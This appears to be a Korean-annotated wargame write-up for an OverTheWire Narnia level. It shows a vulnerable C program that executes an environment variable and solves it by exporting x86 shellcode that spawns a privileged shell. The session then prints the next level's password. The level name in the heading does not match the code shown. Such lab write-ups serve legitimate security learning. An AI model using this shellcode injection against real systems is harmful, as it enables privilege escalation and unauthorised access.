# [*] OverTheWire - narnia0 
[+] Category : EGG 

```c
#include <stdio.h>
int main(){
    int (*ret)();
    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }
    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();
    return 0;
}
```

## [*] HOW 2 SOLVE
1. EGG SHELL?
pass shellCode to env-variable 'EGG'
```bash
# ABOUT ENV VARIABLE
$ echo $HOME
/home/narnia0
$ printenv HOME
/home/narnia0
$ set
HOME='/home/narnia0'
IFS='     
'
LANG='en_US.UTF-8'
LC_ALL='en_US.UTF-8'
LOGNAME='narnia0'
LS_COLORS='rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=3
0;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:
*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=
01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31
:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*
.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:
*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*
.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*
.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.
rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=
01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=0
0;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00
;36:'
MAIL='/var/mail/narnia0'
OLDPWD='/tmp'
OPTIND='1'
PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games'
PPID='17029'
PS1='$ '
PS2='> '
PS4='+ '
PWD='/narnia'
SHELL='/bin/bash'
SHLVL='1'
SSH_CLIENT='35.184.23.59 33660 22'
SSH_CONNECTION='35.184.23.59 33660 192.168.101.40 22'
SSH_TTY='/dev/pts/0'
TERM='xterm-256color'
TMOUT='1800'
USER='narnia0'
_='/usr/bin/python'
narnia1@narnia:/narnia$ export EGG='hello'
narnia1@narnia:/narnia$ echo $EGG
hello
```
2. function pointer & getenv() 
https://www.lazenca.net/display/TEC/01.The+basics+technic+of+Shellcode
위 문서를 읽어보면 대충 어떻게 하라는 건지 알 수 있다.
함수 포인터로 쉘코드를 넘겨서 쉘을 얻어내면 된다. (이제 쉘코드를 만드는 법을 공부해야겠지? ^^)
(shell storm 같은 사이트도 잘 참고해보자.)

```bash
narnia1@narnia:/narnia$ export EGG=`python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68//sh
\x68/bin\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"'`
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ cat /etc/narnia_pass/narnia2
nairiepecu
```
